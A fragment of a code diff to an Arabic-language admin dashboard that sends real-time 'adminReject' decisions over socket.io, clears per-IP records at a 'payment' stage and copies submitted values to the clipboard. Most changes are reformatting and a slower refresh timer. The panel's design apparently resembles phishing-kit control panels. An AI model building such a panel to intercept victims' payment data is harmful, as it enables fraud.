-    if(!data.success&&socket&&socket.connected) socket.emit('adminReject',{requestId:rid,message:msg});
-  }catch(e){
-    if(socket&&socket.connected) socket.emit('adminReject',{requestId:rid,message:msg});
-  }
+    if(!data.success&&socket&&socket.connected)socket.emit('adminReject',{requestId:rid,message:msg});
+  }catch(e){if(socket&&socket.connected)socket.emit('adminReject',{requestId:rid,message:msg});}
   toast('❌ تم الرفض');
-  if(stage==='payment'){ delete ld[ip]; delete ls[ip]; updPend(); rowBadge(ip,null); updateSidebarBadge(ip,null); }
+  if(stage==='payment'){delete ld[ip];delete ls[ip];updPend();updateSidebarBadge(ip,null);}
 }
 
 function disableAbtns(){
@@ -1573,8 +1128,6 @@ function disableAbtns(){
   });
 }
 
-function closeM(){ document.getElementById('modal').classList.remove('open'); curIp=null; }
-
 function cp(t,btn){
   navigator.clipboard.writeText(t).then(()=>{
     toast('📋 نُسخ: '+t);
@@ -1582,16 +1135,19 @@ function cp(t,btn){
   }).catch(()=>{});
 }
 
-function toast(m){ const t=document.getElementById('toast'); t.textContent=m; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),3000); }
+function toast(m){const t=document.getElementById('toast');t.textContent=m;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),3000);}
 
-function beep(f){ try{ const c=new AudioContext(),o=c.createOscillator(),g=c.createGain(); o.connect(g);g.connect(c.destination); o.frequency.value=f; g.gain.setValueAtTime(.2,c.currentTime); g.gain.exponentialRampToValueAtTime(.001,c.currentTime+.4); o.start(c.currentTime);o.stop(c.currentTime+.4); }catch(e){} }
+function beep(f){try{const c=new AudioContext(),o=c.createOscillator(),g=c.createGain();o.connect(g);g.connect(c.destination);o.frequency.value=f;g.gain.setValueAtTime(.2,c.currentTime);g.gain.exponentialRampToValueAtTime(.001,c.currentTime+.4);o.start(c.currentTime);o.stop(c.currentTime+.4);}catch(e){}}
 
-// تحديث تلقائي كل 3 ثواني
+// تحديث تلقائي كل 5 ثواني
 setInterval(()=>{
-  if(socket && !socket.connected){ socket.connect(); }
+  if(socket&&!socket.connected){socket.connect();}
   loadB();
-  if(curIp && document.getElementById('modal').classList.contains('open')){ openM && openM(curIp); }
-}, 3000);
+  if(curBId&&curIp){
+    const b=allB.find(x=>x.id===curBId);
+    if(b) rebuildContent(curIp);
+  }
+},5000);
 </script>
 </body>
 </html>
